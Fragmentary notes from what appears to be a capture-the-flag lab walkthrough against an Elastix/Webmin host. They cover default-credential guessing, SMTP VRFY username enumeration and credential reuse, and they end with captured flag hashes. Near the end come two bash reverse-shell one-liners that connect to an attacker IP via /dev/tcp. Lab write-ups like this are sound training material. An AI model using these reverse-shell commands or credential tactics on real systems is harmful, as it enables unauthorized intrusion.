...
accept cert and get page

*[image unavailable]*
default creds, etc admin admin, 2007, eLaStIx dont work

*[image unavailable]*

*[image unavailable]*
*[image unavailable]*
try the same creds, hit cancel and get here
...
made a python vrfy script
[https://github.com/pentestmonkey/yaptest/blob/master/smtp-usernames.txt](https://github.com/pentestmonkey/yaptest/blob/master/smtp-usernames.txt)
...
tried those creds again in webmin adn they worked
...
shell shock wasnt returning well.
...
*[image unavailable]*
bash -i \>& /dev/tcp/10.10.14.2/8081 0\>&1
bash -c 'bash -i \> & /dev/tcp/10.10.14.2/8888 0\>&1’

a shell finally worked, 
*[image unavailable]*

system own

c1d8d5c9fd929259b5d8d30f58073f58

user own
17e7cb17fd5dc451d7242843f2f90536
